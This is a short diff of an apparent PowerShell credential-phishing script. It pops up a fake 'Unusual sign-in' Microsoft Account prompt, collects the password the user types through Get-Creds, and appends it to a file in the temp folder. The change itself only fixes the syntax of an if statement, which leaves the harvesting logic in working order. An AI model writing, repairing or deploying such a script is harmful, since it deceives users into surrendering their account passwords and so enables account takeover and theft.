@@ -49,7 +49,7 @@ Add-Type -AssemblyName System.Windows.Forms
 [System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")
 
 $creds = Get-Creds
-if($creds -is [system.array]) $creds = $creds[$creds.Length - 1];
+if($creds -is [system.array]) { $creds = $creds[$creds.Length - 1] };
 $creds = "Password: " + $creds;
 echo $creds >> $env:TMP\$FileName
 
